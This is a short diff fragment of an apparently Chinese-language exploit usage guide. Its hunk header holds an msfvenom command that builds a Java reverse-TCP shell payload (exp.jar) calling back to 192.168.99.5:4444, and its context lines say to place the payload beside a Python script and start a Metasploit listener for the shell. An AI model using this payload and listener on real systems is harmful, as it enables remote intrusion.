@@ -32,6 +32,7 @@ msfvenom -p java/shell_reverse_tcp lhost=192.168.99.5 lport=4444 -f jar > exp.ja
 
 
 将攻击载荷`exp.jar`放入到python脚本的同级目录下
+
 注：在脚本中攻击载荷的名字写死了为`exp.jar`，使用者可以随意更换
 
 攻击载荷生成完成后，在msf上建立监听接受反弹的shell
